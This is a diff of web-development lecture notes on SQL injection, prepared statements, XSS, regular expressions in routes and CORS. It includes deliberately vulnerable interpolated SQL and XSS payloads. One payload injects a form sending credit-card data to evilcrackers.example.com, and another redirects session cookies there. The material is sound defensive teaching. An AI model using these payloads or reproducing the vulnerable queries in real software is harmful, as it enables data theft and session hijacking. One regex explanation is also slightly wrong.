@@ -6,16 +6,16 @@
 <link rel='stylesheet' type='text/css' href='../css/dfti0910.css' />
 </head><body>
 <div class='titlebox'>
-<h1>Topic 12: Common Security Issues in Web Development</h1>
+<h1>Topic 11: Common Security Issues in Web Development</h1>
 </div>
-<p>This topic will be revised, due to using SQLite rather than MySQL.</p>
-<p>In this final lecture we will look at security issues, including:
+<p>In this lecture we will look at security issues, including:
 <ul>
 <li>SQL Injection</li>
 <li>Prepared Statements</li>
 <li>Cross-Site Scripting and how to prevent it</li>
 </ul>
 </p>
+<p><strong>Note that the lecture will be accompanied by live examples, demonstrating the exploits - so you should make every effort to either attend the lecture live or watch the recording later. If you read the notes alone, you will get less value from this topic.</strong></p>
 <h2>Firstly, why security?</h2>
 <ul>
 <li>Obviously to protect credit card details and passwords</li>
@@ -29,10 +29,10 @@ users</li>
 <li>A subtle but potentially dangerous security issue</li>
 <li>A cracker could potentially enter an SQL query in an HTML form and 
 grab confidential data, or even modify or delete a table!</li>
-<li>e.g. if we had code such as the following (<code>exec()</code> is an unsafe method of executing an SQL query):
+<li>e.g. if we had code such as the following (an unsafe method of executing an SQL query):
 <pre>
-... connect to database ...
-db.exec(`select * from details where name='${req.params.name}'`, ...);
+// ... connect to database ...
+const stmt = db.prepare(`select * from details where name='${req.params.name}'`);
 </pre>
 </li>
 <li>If the user entered in the form the following:
@@ -48,7 +48,8 @@ with potentially devastating results!!!</li>
 <ul>
 <li>Imagine a login script to a banking site with code such as that below, which displays your card details:
 <pre>
-const results = db.exec(`SELECT * FROM users where password='${req.body.password}' AND username='${req.body.username}'`);
+const stmt = db.prepare(`SELECT * FROM users where password='${req.body.password}' AND username='${req.body.username}'`);
+const results = stmt.run();
 html = "";
 results.forEach ( result =&gt; {
 	html += `Credit card: ${result.creditcard} Expiry date: ${result.expiry}&lt;br /&gt;`;
@@ -79,7 +80,7 @@ SQL query:
 it will return all records in the users table, including their credit card details!</li>
 </ul>
 <h3>Prepared statements and placeholders to prevent SQL injection</h3>
-<p>If you look at the code above, you will see it is <em>unlike</em> the code we've been developing so far. We've been using <strong>prepared statements</strong> with <strong>placeholders</strong>, which prevents SQL injection occurring. 
+<p>We have in fact been writing our code in a manner to prevent SQL injection all along. If you look at the code above, you will see it is <em>unlike</em> the code we've been developing so far. We've been using <strong>prepared statements</strong> with <strong>placeholders</strong>, which prevents SQL injection occurring. 
 With prepared statements, the SQL statements are compiled (prepared) into a binary form, which is executed more rapidly by the database, and this binary form is cached and thus can then be re-used, improving the efficiency of your application. The placeholders (<code>?</code>) are replaced by the specified input parameters, and this method is not vulnerable to SQL injection.</p>
 <h2>Cross-site scripting (XSS)</h2>
 <ul>
@@ -127,7 +128,7 @@ process all tags returned from the server
 <p>For example:
 <pre>
 &lt;input type="hidden" name="id" 
-value=<em>"17&lt;form action=http://evilcrackers.example.com/steal.php&gt;Input credit card:
+value=<em>"17&lt;form action=http://evilcrackers.example.com/steal&gt;Input credit card:
 &lt;input name=creditcard /&gt;&lt;/form&gt;"</em> /&gt;
 </pre>
 </p>
@@ -147,7 +148,7 @@ current web page (window.location) to <code>evilcrackers.example.com/stealcookie
 </li>
 <li>The user will be taken to HitTastic!, but, as the ID is echoed out, the JavaScript will immediately
 run (as in the first example) and redirect the user to <code>evilcrackers.example.com</code></li>
-<li>The owners of <code`>evilcrackers.example.com/stealcookie</code> 
+<li>The owners of <code>evilcrackers.example.com/stealcookie</code> 
 will then have the session ID and can impersonate the original user by copying the session ID to their own cookies; the genuine website will then think they are the attacked user</li>
 <li>If <code>evilcrackers.example.com</code> are really nasty, they could then redirect
 the user straight back to HitTastic!, so the user will be unaware of the
@@ -170,6 +171,19 @@ JavaScript:
 <pre>&lt;script&gt;alert(666)&lt;/script&gt;</pre>
 meaning the attack still takes place</li>
 </ul>
+
+<h3>XSS attacks in a database</h3>
+
+<ul>
+<li>A further way 
+in which XSS can be done is by storing harmful JavaScript code in a database
+(e.g. adding it through form input which is then stored in a database)</li>
+<li>The XSS will only occur when the contents of the database are echoed out, later</li>
+<li>For this reason you should either validate input to a database, or guard against XSS when <em>outputting</em> data
+(as this will not depend on where the XSS attack has come from)</li>
+</ul>
+
+
 <h3>Guarding against basic XSS attacks: using the Node xss module</h3>
 <p>Node makes it easy to guard against XSS attacks using the <code>xss</code> module. With this, you can sanitise any input before it's output again. This invoves replacing characters with special meaning to HTML, such as &lt; and &gt; with their HTML entities, such as &amp;lt; and &amp;gt;. The attack relies on the browser receiving HTML tags in the response, so if these are sanitised, the browser will not interpret them as tags and the attack cannot take place. For example:
 <pre>import xss from 'xss';
@@ -187,14 +201,77 @@ would be sent back to the client, and the browser would execute the JavaScript i
 and the browser will not interpret &amp;lt;script&amp;gt; as a script tag, so the attack will not take place.</p>
 <p>It's also of note that if you use EJS, this sanitisation takes place automatically when you render (without the need for the <code>xss</code> module), as long as you use &lt;%= rather than &lt;%- to render data.</p>
 <h3>Using regular expressions in routes</h3>
-<p>Another way of guarding against XSS attacks is to restrict the characters allowed in a route. This can be done through the use of <em>regular expressions</em>, e.g.:
+<p>Another way of guarding against XSS attacks is to restrict the characters allowed in a route. This can be done through the use of <em>regular expressions</em>. Regular expressions are a special syntax which are used to detect certain <em>patterns</em> in text (e.g. numbers, letters, or a mix of numbers and letters). For example:
 <pre>
 app.post('/song/buy/:ID(\\d+)', (req, res) ...
 </pre>
 The <code>\\d+</code> is a regular expression specifying one or more digits, so if the ID contains anything other than digits it will not match the route.
-See <a href='https://expressjs.com/en/guide/routing.html'>the documentation</a> for more.</p>
-<h2>Other issues</h2>
-<p>There are also other security issues which we will not have time to cover, for example Cross-Site Request Forgery (XSRF). I would recommend reading about these topics in your own time.</p>
+
+
+
+
+
+<h4> Simple regular expressions</h4>
+
+
+<ul>
+<li>
+<pre>^<em>[0123456789]+</em>$</pre>
+This regular expression will match one or more digits 0 to 9 in an input string</li>
+<li><em>^</em> means the beginning of our text;
+<em>$</em> means the end of our text</li>
+<li><em>+</em> means "one or more of"</li>
+<li><em>[</em> ane <em>]</em> define a group of accepted characters</li>
+<li>A simpler way of doing the above example is to use <em>-</em> to define a range of allowed characters:
+<pre>^<em>[0-9]+</em>$
+</pre>
+</li>
+<li>A similar example matches one or more digits or upper or lower-case letters:
+<pre>^<em>[0-9A-Za-z]+</em>$</pre>
+</li>
+<li>and this one will also match underscores:
+<pre>^<em>[0-9A-Za-z_]+</em>$</pre>
+</li>
+</ul>
+
+
+
+
+<h4>More simple regular expressions</h4>
+
+<pre>^<em>\w\w\w\w\w</em>\s<em>\w\w\w\w\w</em>$
+</pre>
+<ul>
+<li>This regular expression will match two five-letter words separated
+by a single "white space" (space or tab)</li>
+<li><em>^</em> means the beginning of our text;
+<em>$</em> means the end of our text</li>
+<li><em>\w</em> means any letter, number or underscore; 
+<em>\s</em> means any "white space" (space or tab)</li>
+</ul>
+<pre>^<em>\w{5}</em>\s<em>\w{5}</em>$
+</pre>
+<ul>
+<li>This is shorthand for the above; \w{5} means "match five letters,
+numbers or tabs"</li>
+</ul>
+<pre>^<em>\w+</em>\s<em>\w+</em>$
+</pre>
+<ul>
+<li>This regular expression will match two words of any length 
+separated by a single "white space"</li>
+<li>As we have seen, <em>+</em> means "one or more of the preceding element"; i.e.
+<em>\w+</em> means "one or more letter, number or underscore"</li>
+</ul>
+
+
+<h4>More on regular expressions</h4>
+<p>See <a href='https://expressjs.com/en/guide/routing.html'>the documentation</a> for more information on using regular expressions in routes.</p>
+
+<h3>XSS, AJAX and CORS</h3>
+<p>Imagine an XSS attack that takes place over AJAX, in other words a phishing site includes an AJAX-based form to access a legitimate site. Due to the same-origin policy, this would <em>not be allowed</em> by default. For example if <code>evilcrackers.example.com</code> included AJAX forms on their phishing site and tried to send an AJAX request to <code>hittastic.example.com</code>, it would be blocked because the request is from a different server. This is the basis of the same-origin policy and illustrates why it is applied by default, to reduce the risk of XSS and other similar attacks.</p>
+
+<p>This is why you need to be careful when using CORS, which if you remember, is a way of circumventing the same-origin policy. You should generally avoid opening up <em>all</em> routes of your application to <em>all</em> clients, as it would then make your site vulnerable to AJAX-based XSS attacks. Instead, only open up low-risk endpoints, such as those which do not change any data and do not reveal confidential information. Also, you should explicitly specify the list of allowed clients with CORS if you are concerned about XSS, rather than the wildcard <code>*</code> which allows <em>any</em> client to connect.</p>
 
 <h2>General security, privacy and usability recommendations</h2>
 <p>I would like to finish with a few recommendations when developing web applications, to take into account security, privacy and usability. These include:
@@ -206,8 +283,21 @@ See <a href='https://expressjs.com/en/guide/routing.html'>the documentation</a> 
     <li>Ensure you test your site with common ad-blockers, such as uBlock Origin, enabled. Ensure your site works with "Strict" privacy enabled. Ad-blockers and strict privacy levels are used by many users to guard against at best annoying, and at worst dangerous and privacy-invading, invasive popup ads. Morally, if perhaps not legally, core functionality must still work when a user takes these measures.</li>
     </ul>
 Unfortunately some web developers ignore the last point in particular, so much so that making payments on certain sites operated by very well-known companies are impossible with ad-blocker enabled.</p>
-<!--
+
+
+<div>
+<h3>In summary...</h3>
+
+<ul>
+<li>XSS attacks can occur in a number of different places in your code</li>
+<li>Choose an appropriate XSS prevention technique depending on the context (normal dynamic HTML
+data, dynamic JavaScript, dynamic URLs etc)</li>
+<li>Security libraries can help as XSS prevention is built into them automatically</li>
+</ul>
+
+</div>
+
 <h2>Examples for today</h2>
-<p>The source code for the live examples can be found <a href='https://github.com/nwcourses/nwcourses.github.io/tree/master/COM518/examples/security'>on GitHub</a>. Note that the phishing site uses PHP and Apache, rather than Node and Express - to highlight the fact that it is an entirely separate site.</p>
--->
+<p>The source code for the live examples can be found <a href='https://github.com/nwcourses/nwcourses.github.io/tree/master/COM518/examples/security'>on GitHub</a>. Note that the phishing site uses port 3001, rather than port 3000 - to highlight the fact that it is an entirely separate site.</p>
+
 </body></html>
